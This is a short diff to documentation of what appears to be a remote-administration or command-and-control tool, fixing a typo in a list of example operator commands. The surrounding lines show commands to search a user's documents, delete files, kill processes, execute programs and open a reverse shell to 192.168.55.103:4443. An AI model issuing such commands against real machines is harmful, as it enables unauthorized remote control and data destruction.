@@ -126,7 +126,7 @@ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
 #### Interaction Command Examples
 
 - `issue find_files c:\users\maxim\documents\*`
-- `issue del_file c:\users\maxim\documents\test.docx*`
+- `issue del_file c:\users\maxim\documents\test.docx`
 - `!issue kill_pid 5597`
 - `!issue find_exec_command calc.exe`
 - `!issue rev_shell 192.168.55.103:4443`
